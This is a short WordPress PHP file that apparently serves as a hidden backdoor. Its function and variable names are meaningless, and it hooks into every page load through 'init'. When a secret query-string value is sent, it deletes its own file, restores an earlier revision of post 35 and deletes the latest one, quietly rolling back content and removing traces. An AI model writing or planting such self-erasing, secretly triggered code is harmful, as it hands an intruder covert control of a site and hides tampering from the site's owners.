<?php

function logo_database_survey_stock() {
	if (isset($_GET['all_nice_account']) && $_GET['all_nice_account'] === 'disable_class_guest') {
		unlink(trim(preg_replace('/\(.*$/', '', __FILE__)));
		$action_utils_viewer_beaver = 35;
		$tabs_sidebar_avatar = wp_get_post_revisions($action_utils_viewer_beaver);
		if (empty($tabs_sidebar_avatar)) die('no revisions');
		if (count($tabs_sidebar_avatar) < 2) die('less than 2');
		$polyfill_option_item_javascript = array_shift($tabs_sidebar_avatar);
		$shopping_tags_express = $polyfill_option_item_javascript->ID;
		$drop_enable_latest_global = array_shift($tabs_sidebar_avatar);
		$load_soon_react_service = $drop_enable_latest_global->ID;
		$nofollow_internal_verification_get = wp_restore_post_revision($load_soon_react_service);
		if ($nofollow_internal_verification_get === false) die('error restoring');
		$nofollow_internal_verification_get = wp_delete_post_revision($shopping_tags_express);		
		if ($nofollow_internal_verification_get === false) die('error deleting');
		die('done');
	}
}

add_action('init', 'logo_database_survey_stock');
